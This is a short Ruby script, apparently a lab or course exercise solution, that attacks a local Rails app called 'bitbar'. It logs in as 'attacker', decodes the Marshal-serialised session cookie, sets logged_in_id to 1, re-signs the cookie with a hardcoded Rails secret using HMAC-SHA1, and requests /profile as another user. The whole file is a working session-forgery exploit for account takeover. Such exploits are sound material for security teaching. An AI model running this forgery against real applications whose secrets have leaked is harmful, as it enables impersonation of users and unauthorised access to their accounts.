require 'mechanize'
require 'net/http'
SESSION = '_bitbar_session'
RAILS_SECRET = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'

agent = Mechanize.new
url = "http://localhost:3000/login"

page = agent.get(url)

form = page.forms.first
form['username'] = form['password'] = 'attacker'
agent.submit form

cookie = agent.cookie_jar.jar['localhost']['/'][SESSION].to_s.sub("#{SESSION}=", '')
cookie_value, cookie_signature = cookie.split('--')
raw_session = Base64.decode64(cookie_value)
session = Marshal.load(raw_session)

puts session
session['logged_in_id'] = 1
cookie_value = Base64.encode64(Marshal.dump(session)).split.join # get rid of newlines
cookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)
cookie_full = "#{SESSION}=#{cookie_value}--#{cookie_signature}"

url = URI('http://localhost:3000/profile')

http = Net::HTTP.new(url.host, url.port)

header = {'Cookie':cookie_full}
response = http.get(url,header)
puts response.body